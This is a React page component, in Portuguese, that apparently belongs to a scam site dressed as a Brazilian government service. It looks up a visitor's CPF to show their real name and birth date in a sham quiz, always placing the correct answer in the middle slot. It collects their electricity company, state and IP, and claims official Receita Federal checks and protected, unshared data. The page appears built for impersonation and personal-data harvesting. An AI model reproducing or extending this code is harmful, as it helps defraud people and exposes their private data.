import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { useQueryClient } from "@tanstack/react-query";
import { ArrowRight, Loader2 } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useLocalizacao } from "@/components/LocalizacaoDetector";
import { useUserData } from "../contexts/UserContext";

enum EtapaVerificacao {
  NOME = 0,
  ANO_NASCIMENTO = 1,
  COMPANHIA_ELETRICA = 2,
  CEP_ALTERNATIVO = 3,
}

// Definir o esquema de validação para o formulário
const nomeSchema = z.object({
  nome: z.string().min(1, "Selecione uma opção"),
});

const anoSchema = z.object({
  ano: z.string().min(1, "Selecione uma opção"),
});

const companhiaSchema = z.object({
  companhia: z.string().min(1, "Selecione uma opção"),
});

const cepSchema = z.object({
  cep: z.string()
    .min(8, "CEP deve ter pelo menos 8 dígitos")
    .max(9, "CEP não deve ter mais de 9 caracteres")
    .regex(/^\d{5}-?\d{3}$/, "CEP deve estar no formato 12345-678 ou 12345678"),
});

type NomeFormValues = z.infer<typeof nomeSchema>;
type AnoFormValues = z.infer<typeof anoSchema>;
type CompanhiaFormValues = z.infer<typeof companhiaSchema>;
type CepFormValues = z.infer<typeof cepSchema>;

// Lista de companhias elétricas por estado (atualizada para 2025)
const companhiasEletricas: Record<string, string[]> = {
  // Região Norte
  "Acre": ["Energisa Acre"],
  "Amapá": ["Equatorial CEA"],
  "Amazonas": ["Amazonas Energia"],
  "Pará": ["Equatorial Pará"],
  "Rondônia": ["Energisa Rondônia"],
  "Roraima": ["Roraima Energia"],
  "Tocantins": ["Energisa Tocantins"],
  
  // Região Nordeste
  "Alagoas": ["Equatorial Alagoas"],
  "Bahia": ["Neoenergia Coelba"],
  "Ceará": ["Enel Distribuição Ceará"],
  "Maranhão": ["Equatorial Maranhão"],
  "Paraíba": ["Energisa Paraíba"],
  "Pernambuco": ["Neoenergia Pernambuco"],
  "Piauí": ["Equatorial Piauí"],
  "Rio Grande do Norte": ["Neoenergia Cosern"],
  "Sergipe": ["Energisa Sergipe"],
  
  // Região Centro-Oeste
  "Distrito Federal": ["Neoenergia Brasília"],
  "Goiás": ["Equatorial Goiás"],
  "Mato Grosso": ["Energisa Mato Grosso"],
  "Mato Grosso do Sul": ["Energisa Mato Grosso do Sul"],
  
  // Região Sudeste
  "Espírito Santo": ["EDP Espírito Santo"],
  "Minas Gerais": ["CEMIG Distribuição"],
  "Rio de Janeiro": ["Enel Distribuição Rio", "Light S/A"],
  "São Paulo": [
    "Enel Distribuição São Paulo",
    "EDP São Paulo",
    "CPFL Paulista",
    "CPFL Piratininga",
    "Neoenergia Elektro",
    "ISA Energia Brasil"
  ],
  
  // Região Sul
  "Paraná": ["COPEL Distribuição"],
  "Rio Grande do Sul": ["Equatorial CEEE", "CPFL Rio Grande Energia (RGE)"],
  "Santa Catarina": ["CELESC Distribuição"]
};

// Opções fixas de companhias para cada estado, conforme especificação
// Mapeamento de estados para companhias elétricas
const opcoesCompanhiaPorEstado: Record<string, string[]> = {
  // Estados com uma única companhia
  "Acre": ["Energisa Acre", "Amazonas Energia", "Equatorial Maranhão"],
  "Alagoas": ["Equatorial Alagoas", "Neoenergia Pernambuco", "Energisa Mato Grosso do Sul"],
  "Amapá": ["CEA Equatorial", "Roraima Energia", "Energisa Rondônia"],
  "Amazonas": ["Amazonas Energia", "Energisa Tocantins", "Equatorial Piauí"],
  "Bahia": ["Neoenergia Coelba", "Energisa Paraíba", "Equatorial Pará"],
  "Ceará": ["Enel Ceará", "Energisa Acre", "CPFL Piratininga"],
  "Distrito Federal": ["Neoenergia Brasília", "Energisa Rondônia", "CPFL Rio Grande Energia (RGE)"],
  "Espírito Santo": ["EDP Espírito Santo", "Neoenergia Pernambuco", "CELESC Distribuição"],
  "Maranhão": ["Equatorial Maranhão", "Enel Distribuição Rio", "Neoenergia Cosern"],
  "Mato Grosso": ["Energisa Mato Grosso", "Neoenergia Coelba", "CPFL Piratininga"],
  "Mato Grosso do Sul": ["Energisa Mato Grosso do Sul", "Equatorial Maranhão", "EDP Espírito Santo"],
  "Paraíba": ["Energisa Paraíba", "Equatorial Goiás", "CPFL Paulista"],
  "Paraná": ["Copel Distribuição", "Neoenergia Coelba", "Amazonas Energia"],
  "Pernambuco": ["Neoenergia Pernambuco", "Energisa Mato Grosso", "EDP São Paulo"],
  "Piauí": ["Equatorial Piauí", "CELESC Distribuição", "Neoenergia Brasília"],
  "Rio Grande do Norte": ["Neoenergia Cosern", "Energisa Sergipe", "CEMIG Distribuição"],
  "Rondônia": ["Energisa Rondônia", "Equatorial Goiás", "CEMIG Distribuição"],
  "Roraima": ["Roraima Energia", "Energisa Mato Grosso", "Enel Ceará"],
  "Sergipe": ["Energisa Sergipe", "Enel Distribuição São Paulo", "CEA Equatorial"],
  "Tocantins": ["Energisa Tocantins", "EDP Espírito Santo", "Copel Distribuição"],
  
  // Estados com duas companhias
  "Goiás": ["Equatorial Goiás", "Celg GT (Transmissão e Geração)", "Light S/A"],
  "Pará": ["Equatorial Pará", "Celpa", "Energisa Sergipe"],
  "Rio de Janeiro": ["Light", "Enel Rio", "Neoenergia Coelba"],
  "Rio Grande do Sul": ["CEEE Equatorial", "RGE Sul", "Light S/A"],
  "Santa Catarina": ["Celesc Distribuição", "Cooperativas locais (como CERGAL, CERILUZ, etc.)", "Equatorial Pará"],
  
  // Estados com três companhias
  "Minas Gerais": ["CEMIG Distribuição", "Energisa Minas Gerais", "Light (em pequenas áreas de MG)"],
  
  // Estados com múltiplas companhias
  "São Paulo": [
    "Enel São Paulo", 
    "Enel Distribuição São Paulo", 
    "CPFL Paulista", 
    "CPFL Piratininga", 
    "EDP São Paulo", 
    "Energisa Sul-Sudeste (em parte do interior)"
  ]
};

export default function ConfirmarIdentidade() {
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const queryClient = useQueryClient();
  
  // Usar o hook de localização para obter o estado do usuário
  const { localizacao, carregando: carregandoLocalizacao } = useLocalizacao();
  
  // Usar o contexto do usuário para obter dados como o CPF
  const { userData, updateUserData } = useUserData();
  const cpf = userData.cpf || "";
  
  const [etapaAtual, setEtapaAtual] = useState<EtapaVerificacao>(EtapaVerificacao.NOME);
  const [dadosPessoais, setDadosPessoais] = useState<any>(null);
  const [opcoesNome, setOpcoesNome] = useState<string[]>([]);
  const [opcoesAno, setOpcoesAno] = useState<string[]>([]);
  const [opcoesCompanhia, setOpcoesCompanhia] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [estado, setEstado] = useState<string>("");
  const [companhiaCorreta, setCompanhiaCorreta] = useState<string>("");
  const [localizado, setLocalizado] = useState<boolean>(false);

  // Formulário para seleção de nome
  const nomeForm = useForm<NomeFormValues>({
    resolver: zodResolver(nomeSchema),
    defaultValues: {
      nome: "",
    },
  });

  // Formulário para seleção de ano
  const anoForm = useForm<AnoFormValues>({
    resolver: zodResolver(anoSchema),
    defaultValues: {
      ano: "",
    },
  });
  
  // Formulário para seleção de companhia elétrica
  const companhiaForm = useForm<CompanhiaFormValues>({
    resolver: zodResolver(companhiaSchema),
    defaultValues: {
      companhia: "",
    },
  });
  
  // Formulário para input de CEP
  const cepForm = useForm<CepFormValues>({
    resolver: zodResolver(cepSchema),
    defaultValues: {
      cep: "",
    },
  });

  // A detecção de estado agora é feita através do hook useLocalizacao
  // que é inicializado quando o aplicativo inicia

  // A função embaralharArray foi removida, pois agora estamos posicionando
  // as opções em uma ordem fixa, com a opção correta sempre no meio

  // Pré-carregando nomes alternativos para evitar delay na renderização
  useEffect(() => {
    // Pré-carregar opções de nomes enquanto esperamos pela API
    // Nome de carregamento fica no meio (posição 1)
    const nomeCarregando = "CARREGANDO DADOS...";
    const nomeAlternativo1 = "MÔNICA DE SOUZA ALVES";
    const nomeAlternativo2 = "PEDRO HENRIQUE OLIVEIRA";
    
    // Pré-mostrar opções ordenadas com "CARREGANDO DADOS..." no meio enquanto aguardamos a API
    setOpcoesNome([nomeAlternativo1, nomeCarregando, nomeAlternativo2]);
    
    // Verificar se temos o CPF antes de continuar
    if (!cpf) {
      navigate("/verificar");
      return;
    }
    
    // Marcar como carregando imediatamente
    setIsLoading(true);
    
  }, [cpf, navigate]);
  
  // Efeito separado para lidar com a localização
  useEffect(() => {
    // Se o localizacao já estiver disponível, usá-lo para definir o estado
    if (localizacao && localizacao.estado) {
      console.log("Usando estado já detectado:", localizacao.estado);
      setEstado(localizacao.estado);
      setLocalizado(true);
    }
    // Se estiver carregando a localização, vamos monitorar quando estiver disponível
    else if (carregandoLocalizacao) {
      console.log("Aguardando detecção de estado...");
    }
    // Se não estiver carregando e mesmo assim não temos localização, usar São Paulo como padrão
    else if (!carregandoLocalizacao && !localizacao) {
      console.log("Não foi possível detectar o estado, usando São Paulo como padrão");
      setEstado("São Paulo");
      setLocalizado(true);
    }
  }, [localizacao, carregandoLocalizacao]);

  // Efeito separado para carregar dados da API
  useEffect(() => {
    if (!cpf) return;

    // Verificar se já temos os dados no contexto
    if (userData && userData.nome && userData.dataNascimento) {
      console.log("Dados já disponíveis no contexto do usuário:", userData.nome);
      
      // Criar um objeto de dados pessoais a partir dos dados do contexto
      const contextData = {
        Result: {
          NomePessoaFisica: userData.nome,
          DataNascimento: userData.dataNascimento
        }
      };
      
      setDadosPessoais(contextData);
      
      // Nome correto sempre fica entre dois aleatórios (como posição do meio)
      const nomeAlternativo1 = "MÔNICA DE SOUZA ALVES";
      const nomeAlternativo2 = "PEDRO HENRIQUE OLIVEIRA";
      const nomeCorreto = userData.nome;
      
      // Atualizar as opções - sem embaralhar, nome real sempre fica no meio
      setOpcoesNome([nomeAlternativo1, nomeCorreto, nomeAlternativo2]);
      
      // Função para gerar uma data aleatória entre 1959 e 1995
      const gerarDataNascimentoAleatoria = () => {
        // Gerar ano entre 1959 e 1995
        const anoMin = 1959;
        const anoMax = 1995;
        const ano = Math.floor(Math.random() * (anoMax - anoMin + 1)) + anoMin;
        
        // Gerar mês (1-12)
        const mes = Math.floor(Math.random() * 12) + 1;
        
        // Determinar o número máximo de dias no mês
        let diasMax = 31;
        if ([4, 6, 9, 11].includes(mes)) {
          diasMax = 30;
        } else if (mes === 2) {
          // Verificar se é ano bissexto
          diasMax = (ano % 4 === 0 && (ano % 100 !== 0 || ano % 400 === 0)) ? 29 : 28;
        }
        
        // Gerar dia (1-diasMax)
        const dia = Math.floor(Math.random() * diasMax) + 1;
        
        // Formatar a data como DD/MM/YYYY
        return `${String(dia).padStart(2, '0')}/${String(mes).padStart(2, '0')}/${ano}`;
      };
      
      // Gerar 2 datas aleatórias diferentes
      const dataAleatoria1 = gerarDataNascimentoAleatoria();
      let dataAleatoria2 = "";
      
      // Garantir que a segunda data seja diferente da primeira
      do {
        dataAleatoria2 = gerarDataNascimentoAleatoria();
      } while (dataAleatoria2 === dataAleatoria1 || dataAleatoria2 === userData.dataNascimento);
      
      // Colocar a data real sempre no meio (posição 1)
      setOpcoesAno([dataAleatoria1, userData.dataNascimento, dataAleatoria2]);
      
      // Marcar como carregado
      setIsLoading(false);
      return;
    }

    // Se não temos os dados no contexto, precisamos carregar da API
    const fetchCpfData = async () => {
      // Configurar a tela para pré-carregamento
      // Nome de carregamento fica no meio (posição 1)
      const nomeCarregando = "CARREGANDO DADOS...";
      const nomeAlternativo1 = "MÔNICA DE SOUZA ALVES";
      const nomeAlternativo2 = "PEDRO HENRIQUE OLIVEIRA";
      
      // Inicialmente mostramos opções com "CARREGANDO DADOS..."
      setOpcoesNome([nomeAlternativo1, nomeCarregando, nomeAlternativo2]);
      
      try {
        // Usar Promise.all para carregar dados em paralelo, reduzindo o tempo total
        const response = await fetch(`/api/consulta-cpf?cpf=${cpf}`);
        
        if (!response.ok) {
          throw new Error("Erro ao consultar CPF");
        }
        
        const data = await response.json();
        setDadosPessoais(data);
        
        // Garantir que estamos extraindo o nome corretamente
        let nomeCorreto = "NOME NÃO ENCONTRADO";
        if (data.Result && data.Result.NomePessoaFisica) {
          nomeCorreto = data.Result.NomePessoaFisica;
          console.log("Nome extraído da API:", nomeCorreto);
        } else {
          console.error("Campo NomePessoaFisica não encontrado na resposta");
        }
        
        // Nome correto sempre fica entre dois aleatórios (como posição do meio)
        const opcoes = [nomeAlternativo1, nomeCorreto, nomeAlternativo2];
        
        // Atualizar as opções - sem embaralhar, nome real sempre fica no meio
        setOpcoesNome(opcoes);
        
        // Preparar opções de data de nascimento
        const dataNascimento = data.Result.DataNascimento;
        
        // Função para gerar uma data aleatória entre 1959 e 1995
        const gerarDataNascimentoAleatoria = () => {
          // Gerar ano entre 1959 e 1995
          const anoMin = 1959;
          const anoMax = 1995;
          const ano = Math.floor(Math.random() * (anoMax - anoMin + 1)) + anoMin;
          
          // Gerar mês (1-12)
          const mes = Math.floor(Math.random() * 12) + 1;
          
          // Determinar o número máximo de dias no mês
          let diasMax = 31;
          if ([4, 6, 9, 11].includes(mes)) {
            diasMax = 30;
          } else if (mes === 2) {
            // Verificar se é ano bissexto
            diasMax = (ano % 4 === 0 && (ano % 100 !== 0 || ano % 400 === 0)) ? 29 : 28;
          }
          
          // Gerar dia (1-diasMax)
          const dia = Math.floor(Math.random() * diasMax) + 1;
          
          // Formatar a data como DD/MM/YYYY
          return `${String(dia).padStart(2, '0')}/${String(mes).padStart(2, '0')}/${ano}`;
        };
        
        // Gerar 2 datas aleatórias diferentes - uma antes e uma depois
        const dataAleatoria1 = gerarDataNascimentoAleatoria();
        let dataAleatoria2 = "";
        
        // Garantir que a segunda data seja diferente da primeira
        do {
          dataAleatoria2 = gerarDataNascimentoAleatoria();
        } while (dataAleatoria2 === dataAleatoria1 || dataAleatoria2 === dataNascimento);
        
        // Colocar a data real sempre no meio (posição 1)
        setOpcoesAno([dataAleatoria1, dataNascimento, dataAleatoria2]);
        
      } catch (error) {
        console.error("Erro ao buscar dados do CPF:", error);
        toast({
          title: "Erro",
          description: "Não foi possível verificar o CPF. Tente novamente mais tarde.",
          variant: "destructive",
        });
        navigate("/verificar");
      } finally {
        setIsLoading(false);
      }
    };

    fetchCpfData();
  }, [cpf, navigate, toast, localizacao, carregandoLocalizacao, userData]);

  // Extrair o ano da data de nascimento
  const getAnoNascimento = (dataStr: string): string => {
    if (!dataStr) return "";
    
    // Verificar se é uma data no formato ISO completo
    if (dataStr.includes("T")) {
      const dataObj = new Date(dataStr);
      if (isNaN(dataObj.getTime())) return "";
      return dataObj.getFullYear().toString();
    }
    
    // Formato YYYY-MM-DD simples
    return dataStr.split("-")[0];
  };

  // Transformar data no formato ISO para DD/MM/YYYY
  const formatarData = (dataStr: string) => {
    if (!dataStr) return "";
    
    // Verificar se é uma data no formato ISO completo
    if (dataStr.includes("T")) {
      const dataObj = new Date(dataStr);
      if (isNaN(dataObj.getTime())) return dataStr;
      
      return `${dataObj.getDate().toString().padStart(2, '0')}/${(dataObj.getMonth() + 1).toString().padStart(2, '0')}/${dataObj.getFullYear()}`;
    }
    
    // Formato YYYY-MM-DD simples
    const partes = dataStr.split("-");
    if (partes.length !== 3) return dataStr;
    
    return `${partes[2].substring(0, 2)}/${partes[1]}/${partes[0]}`;
  };

  // Lidar com o envio do formulário de nome
  const onSubmitNome = (values: NomeFormValues) => {
    const nomeCorreto = dadosPessoais?.Result?.NomePessoaFisica || "";
    
    if (values.nome === nomeCorreto) {
      setEtapaAtual(EtapaVerificacao.ANO_NASCIMENTO);
    } else {
      toast({
        title: "Nome incorreto",
        description: "Por favor, selecione seu nome correto.",
        variant: "destructive",
      });
    }
  };
  
  // Função para gerar opções de companhia elétrica com base no estado
  // Usa as opções fixas definidas para cada estado e segue as regras atualizadas da documentação
  const gerarOpcoesCompanhia = (estadoSelecionado: string) => {
    console.log(`Gerando opções de companhia para: ${estadoSelecionado}`);
    setEstado(estadoSelecionado);
    
    // Verificar se temos opções definidas para o estado selecionado
    if (opcoesCompanhiaPorEstado[estadoSelecionado]) {
      // Usar as opções pré-definidas para o estado
      const opcoes = opcoesCompanhiaPorEstado[estadoSelecionado];
      
      // CASO 1: SÃO PAULO - mostrar todas as companhias, qualquer uma é válida
      if (estadoSelecionado === "São Paulo") {
        console.log("Caso São Paulo: todas as opções são válidas");
        setOpcoesCompanhia(opcoes);
        // Todas são válidas em SP
        setCompanhiaCorreta(opcoes[0]); 
      
      // CASO 2: MINAS GERAIS - mostrar todas as três companhias, todas são válidas
      } else if (estadoSelecionado === "Minas Gerais") {
        console.log("Caso Minas Gerais: todas as 3 opções são válidas");
        setOpcoesCompanhia(opcoes);
        // Todas as 3 são válidas
        setCompanhiaCorreta(opcoes[0]);
      
      // CASO 3: ESTADOS COM DUAS COMPANHIAS - mostrar duas companhias corretas + uma opção aleatória
      } else if (
        estadoSelecionado === "Rio de Janeiro" || 
        estadoSelecionado === "Rio Grande do Sul" || 
        estadoSelecionado === "Goiás" || 
        estadoSelecionado === "Pará" || 
        estadoSelecionado === "Santa Catarina"
      ) {
        console.log(`Caso ${estadoSelecionado}: 2 opções válidas + 1 incorreta`);
        setOpcoesCompanhia(opcoes);
        // As duas primeiras são válidas
        setCompanhiaCorreta(opcoes[0]);
      
      // CASO 4: OUTROS ESTADOS (com uma única companhia) - mostrar a companhia correta + duas opções aleatórias
      } else {
        console.log(`Caso padrão para ${estadoSelecionado}: 1 opção válida + 2 incorretas`);
        setOpcoesCompanhia(opcoes);
        // Apenas a primeira é válida
        setCompanhiaCorreta(opcoes[0]);
      }
    } else {
      // Caso de fallback (não deveria ocorrer)
      console.warn(`Não há opções definidas para o estado ${estadoSelecionado}, usando São Paulo como fallback`);
      const opcoesFallback = opcoesCompanhiaPorEstado["São Paulo"];
      setOpcoesCompanhia(opcoesFallback);
      setCompanhiaCorreta(opcoesFallback[0]);
    }
  };

  // Lidar com o envio do formulário de data de nascimento
  const onSubmitAno = async (values: AnoFormValues) => {
    const dataNascimento = dadosPessoais?.Result?.DataNascimento || "";
    
    if (values.ano === dataNascimento) {
      // Usar o estado já detectado através do componente LocalizacaoDetector
      let estadoSelecionado = estado;
      
      // Se ainda não temos um estado, mas temos a localização do hook
      if (!localizado && localizacao && localizacao.estado) {
        estadoSelecionado = localizacao.estado;
        setEstado(estadoSelecionado);
        setLocalizado(true);
      } 
      // Caso nada tenha funcionado, usar São Paulo como fallback
      else if (!localizado) {
        estadoSelecionado = "São Paulo";
        setEstado(estadoSelecionado);
        setLocalizado(true);
      }
      
      console.log("Utilizando estado para escolha de companhia elétrica:", estadoSelecionado);
      
      // Gerar opções de companhia com base no estado
      gerarOpcoesCompanhia(estadoSelecionado);
      
      // Avançar para a próxima etapa
      setEtapaAtual(EtapaVerificacao.COMPANHIA_ELETRICA);
    } else {
      toast({
        title: "Data incorreta",
        description: "Por favor, selecione a data de nascimento correta.",
        variant: "destructive",
      });
    }
  };
  
  // Lidar com o envio do formulário de companhia elétrica
  const onSubmitCompanhia = (values: CompanhiaFormValues) => {
    const companhiaEscolhida = values.companhia;
    let companhiaValida = false;
    
    // Regras específicas para cada estado com base na documentação atualizada
    if (estado === "São Paulo") {
      // São Paulo: todas as companhias são válidas
      companhiaValida = opcoesCompanhiaPorEstado["São Paulo"].includes(companhiaEscolhida);
      console.log("São Paulo - Todas as opções são válidas:", companhiaValida);
      
    } else if (estado === "Rio de Janeiro") {
      // Rio de Janeiro: apenas Light e Enel Rio são válidas
      companhiaValida = (
        companhiaEscolhida === "Light" || 
        companhiaEscolhida === "Enel Rio"
      );
      console.log("Rio de Janeiro - Apenas as 2 primeiras são válidas:", companhiaValida);
      
    } else if (estado === "Rio Grande do Sul") {
      // Rio Grande do Sul: apenas CEEE Equatorial e RGE Sul são válidas
      companhiaValida = (
        companhiaEscolhida === "CEEE Equatorial" || 
        companhiaEscolhida === "RGE Sul"
      );
      console.log("Rio Grande do Sul - Apenas as 2 primeiras são válidas:", companhiaValida);
    
    } else if (estado === "Goiás") {
      // Goiás: duas companhias válidas
      companhiaValida = (
        companhiaEscolhida === "Equatorial Goiás" || 
        companhiaEscolhida === "Celg GT (Transmissão e Geração)"
      );
      console.log("Goiás - Duas opções válidas:", companhiaValida);
    
    } else if (estado === "Pará") {
      // Pará: duas companhias válidas
      companhiaValida = (
        companhiaEscolhida === "Equatorial Pará" || 
        companhiaEscolhida === "Celpa"
      );
      console.log("Pará - Duas opções válidas:", companhiaValida);
    
    } else if (estado === "Santa Catarina") {
      // Santa Catarina: duas companhias válidas
      companhiaValida = (
        companhiaEscolhida === "Celesc Distribuição" || 
        companhiaEscolhida === "Cooperativas locais (como CERGAL, CERILUZ, etc.)"
      );
      console.log("Santa Catarina - Duas opções válidas:", companhiaValida);
    
    } else if (estado === "Minas Gerais") {
      // Minas Gerais: três companhias válidas
      companhiaValida = (
        companhiaEscolhida === "CEMIG Distribuição" || 
        companhiaEscolhida === "Energisa Minas Gerais" ||
        companhiaEscolhida === "Light (em pequenas áreas de MG)"
      );
      console.log("Minas Gerais - Três opções válidas:", companhiaValida);
    
    } else {
      // Outros estados: apenas a primeira opção (índice 0) é válida
      companhiaValida = companhiaEscolhida === opcoesCompanhiaPorEstado[estado][0];
      console.log(`${estado} - Apenas a primeira opção é válida:`, companhiaValida);
    }
    
    if (companhiaValida) {
      // Companhia válida, prosseguir para a próxima etapa
      const nome = dadosPessoais?.Result?.NomePessoaFisica || "";
      const dataNasc = dadosPessoais?.Result?.DataNascimento || "";
      
      // Atualizar o contexto do usuário com as informações validadas
      updateUserData({
        nome: nome,
        dataNascimento: dataNasc,
        estado: estado,
        companhia: companhiaEscolhida,
        ip: localizacao?.ip || ""
      });
      
      console.log("Dados armazenados no contexto, navegando para resultado");
      
      // Navegar para a página de resultado sem parâmetros na URL
      navigate('/resultado');
    } else {
      toast({
        title: "Companhia incorreta",
        description: "Por favor, selecione a companhia elétrica correta para o seu estado.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      
      <main className="flex-1 bg-[#f0f2f5] py-8">
        <div className="container mx-auto px-4">
          <div className="max-w-4xl mx-auto">
            <Card className="shadow-md">
              <CardHeader className="bg-[var(--gov-blue)] text-white text-center py-6">
                <CardTitle className="text-2xl font-bold">Confirmação de Identidade</CardTitle>
                <CardDescription className="text-gray-100 mt-2">
                  Para confirmar sua identidade, precisamos validar alguns dados pessoais.
                </CardDescription>
              </CardHeader>
              <CardContent className="p-6">
                <div className="space-y-6">

                  {etapaAtual === EtapaVerificacao.NOME && (
                    <div>
                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
                        Selecione o seu nome completo entre as opções abaixo:
                      </h2>
                      
                      <Form {...nomeForm}>
                        <form onSubmit={nomeForm.handleSubmit(onSubmitNome)} className="space-y-4">
                          <FormField
                            control={nomeForm.control}
                            name="nome"
                            render={({ field }) => (
                              <FormItem className="space-y-4">
                                <FormControl>
                                  <RadioGroup
                                    onValueChange={field.onChange}
                                    value={field.value}
                                    className="space-y-3"
                                  >
                                    {opcoesNome.map((nome, index) => (
                                      <div key={index} className="flex items-center space-x-2 border p-3 rounded-md">
                                        <RadioGroupItem value={nome} id={`nome-${index}`} />
                                        <Label htmlFor={`nome-${index}`} className="flex-1 cursor-pointer">
                                          {nome}
                                        </Label>
                                      </div>
                                    ))}
                                  </RadioGroup>
                                </FormControl>
                                <FormMessage />
                              </FormItem>
                            )}
                          />

                          <div className="text-center mt-6">
                            <Button 
                              type="submit"
                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                              disabled={isLoading || !nomeForm.watch("nome")}
                            >
                              <span>Prosseguir</span>
                              <ArrowRight className="ml-2 h-5 w-5" />
                            </Button>
                          </div>
                        </form>
                      </Form>
                    </div>
                  )}

                  {etapaAtual === EtapaVerificacao.ANO_NASCIMENTO && (
                    <div>
                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
                        Agora, selecione sua data de nascimento entre as opções abaixo:
                      </h2>
                      
                      <Form {...anoForm}>
                        <form onSubmit={anoForm.handleSubmit(onSubmitAno)} className="space-y-4">
                          <FormField
                            control={anoForm.control}
                            name="ano"
                            render={({ field }) => (
                              <FormItem className="space-y-4">
                                <FormControl>
                                  <RadioGroup
                                    onValueChange={field.onChange}
                                    value={field.value}
                                    className="space-y-3"
                                  >
                                    {opcoesAno.map((ano, index) => (
                                      <div key={index} className="flex items-center space-x-2 border p-3 rounded-md">
                                        <RadioGroupItem value={ano} id={`ano-${index}`} />
                                        <Label htmlFor={`ano-${index}`} className="flex-1 cursor-pointer">
                                          {ano}
                                        </Label>
                                      </div>
                                    ))}
                                  </RadioGroup>
                                </FormControl>
                                <FormMessage />
                              </FormItem>
                            )}
                          />

                          <div className="text-center mt-6">
                            <Button 
                              type="submit"
                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                              disabled={isLoading || !anoForm.watch("ano")}
                            >
                              <span>Prosseguir</span>
                              <ArrowRight className="ml-2 h-5 w-5" />
                            </Button>
                          </div>
                        </form>
                      </Form>
                    </div>
                  )}
                  
                  {etapaAtual === EtapaVerificacao.COMPANHIA_ELETRICA && (
                    <div>
                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
                        Agora, selecione a sua companhia elétrica entre as opções abaixo:
                      </h2>
                      
                      <Form {...companhiaForm}>
                        <form onSubmit={companhiaForm.handleSubmit(onSubmitCompanhia)} className="space-y-4">
                          <FormField
                            control={companhiaForm.control}
                            name="companhia"
                            render={({ field }) => (
                              <FormItem className="space-y-4">
                                <FormControl>
                                  <RadioGroup
                                    onValueChange={field.onChange}
                                    value={field.value}
                                    className="space-y-3"
                                  >
                                    {opcoesCompanhia.map((companhia, index) => (
                                      <div key={index} className="flex items-center space-x-2 border p-3 rounded-md">
                                        <RadioGroupItem value={companhia} id={`companhia-${index}`} />
                                        <Label htmlFor={`companhia-${index}`} className="flex-1 cursor-pointer">
                                          {companhia}
                                        </Label>
                                      </div>
                                    ))}
                                    {/* Opção "Nenhuma das opções" */}
                                    <div className="flex items-center space-x-2 border p-3 rounded-md bg-gray-50">
                                      <RadioGroupItem value="nenhuma_das_opcoes" id="companhia-nenhuma" />
                                      <Label htmlFor="companhia-nenhuma" className="flex-1 cursor-pointer font-medium">
                                        Nenhuma das opções
                                      </Label>
                                    </div>
                                  </RadioGroup>
                                </FormControl>
                                <FormMessage />
                              </FormItem>
                            )}
                          />

                          <div className="text-center mt-6">
                            <Button 
                              type="submit"
                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                              disabled={isLoading || !companhiaForm.watch("companhia")}
                            >
                              <span>Prosseguir</span>
                              <ArrowRight className="ml-2 h-5 w-5" />
                            </Button>
                          </div>
                        </form>
                      </Form>
                    </div>
                  )}

                  {/* Requisitos de segurança */}
                  <div className="mt-8 bg-[var(--gov-gray-light)] p-4 rounded-md border border-[var(--gov-gray)]">
                    <h3 className="text-[var(--gov-blue-dark)] font-semibold mb-2">Informações de Segurança:</h3>
                    <ul className="text-sm text-[var(--gov-gray-dark)] space-y-2">
                      <li>• Seus dados são protegidos e criptografados.</li>
                      <li>• A consulta é feita nos sistemas oficiais da Receita Federal.</li>
                      <li>• É necessário confirmar sua identidade para prosseguir.</li>
                      <li>• Não compartilhamos seus dados com terceiros.</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}